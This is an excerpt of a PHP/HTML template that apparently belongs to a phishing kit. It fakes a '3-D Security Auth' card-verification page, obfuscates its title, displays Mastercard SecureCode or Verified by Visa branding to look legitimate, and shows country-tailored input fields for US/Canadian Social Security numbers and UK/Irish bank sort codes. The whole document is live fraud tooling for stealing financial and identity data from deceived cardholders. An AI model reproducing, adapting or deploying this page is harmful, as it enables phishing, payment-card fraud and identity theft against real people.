...
<html lang="en"><head>
    ...
    <link rel="stylesheet" href="../../../RGN/INC/T_Z118.css">
    <link rel="stylesheet" href="../../../RGN/INC/V_Z118.css">
    <title>&#x33;&#x2D;&#x44;&#x20;&#x53;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x20;&#x41;&#x75;&#x74;&#x68;.</title>
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" type="image/png" href="../../../RGN/lib/img/favicon.ico"></style>
</head>
<body>
        ...
        <div id="xGhostRiderForm" style="display: none;">
            <div id="xDoctorStrange_L0">
                <table>
                    <tbody>
                        <tr>
                            <td><img class="cc_bank" id="cc_bank" src="../../../RGN/INC/ssl.png"></td>
							<?php 
							if($MASTERCARD) {	
                                echo '<td><img class="cc_type" id="cc_type" src="../../../RGN/INC/mastercard-securecode.png"></td>';
							}elseif($VISACARD){
								echo '<td><img class="cc_type" id="cc_type" src="../../../RGN/INC/verified-by-visa.png"></td>';
							}
							?>
                        </tr>
                    </tbody>
            ...
            <div id="xDoctorStrange_L3">
                <table>
                    <tbody>
						...
						<tr>
                            <td style="font-weight: bold;">Country Name :</td><td><?=ucwords(strtolower($_SESSION['_LOOKUP_COUNTRY_']));?></td>
                        </tr>
                        <tr>
                            <td style="font-weight: bold;">Card Type :</td><td><?=ucwords(strtolower($_SESSION['_c_type_']));?></td>
                        </tr>
                        <tr>
        				...
        				################### SWITZERLAND || GERMANY #####################
		    				elseif($countrycode=="CH" or $countrycode=="DE") {	
								echo '<tr class="Height_XXX">
						...
						################# IRELAND || UNITED KINGDOM  ###################
		    				elseif ($countrycode=="IE" or $countrycode=="GB" ) {
		        				echo '  <tr class="Height_XXX">
                            				<td style="font-weight: bold;">Sort Code :</td>
                            				<td><input required type="tel" name="ssn1" id="ssn1" class="ssnum" style="text-align: center;width:48px;padding-left: 2px;" maxlength="3" data-maxlength="3" placeholder="XXX"> - <input required type="tel" name="ssn2" id="ssn2" class="ssnum" style="text-align: center;width: 44px;padding-left: 2px;" maxlength="2" data-maxlength="2" placeholder="XX"> - <input required type="tel" name="ssn3" id="ssn3" class="ssnum" style="text-align: center;width: 58px;padding-left: 4px;" maxlength="4" data-maxlength="4" placeholder="XXXX"></td>
                        				</tr>                  
                        				<tr class="Height_XXX">
						...
						#################### UNITED STATES || CANADA ###################
							elseif ($countrycode=="US" or $countrycode=="CA") {
			    				echo '  <tr class="Height_XXX">
                            				<td style="font-weight: bold;padding-left: 15px;">Social Security (SSN):</td>
                            				<td><input required type="tel" name="ssn1" id="ssn1" class="ssnum" style="text-align: center;width:48px;padding-left: 2px;" maxlength="3" data-maxlength="3" placeholder="XXX"> - <input required type="tel" name="ssn2" id="ssn2" class="ssnum" style="text-align: center;width: 44px;padding-left: 2px;" maxlength="2" data-maxlength="2" placeholder="XX"> - <input required type="tel" name="ssn3" id="ssn3" class="ssnum" style="text-align: center;width: 58px;padding-left: 4px;" maxlength="4" data-maxlength="4" placeholder="XXXX"></td>
                        				</tr>';
							}
						#################### IRELAND || CANADA ###################
							if ($countrycode=="IRELAND" or $countrycode=="CANADA") {
							   echo'<tr class="Height_XXX">
...
<script src="../../../RGN/INC/V-Z118.js"></script>    
</body>
</html>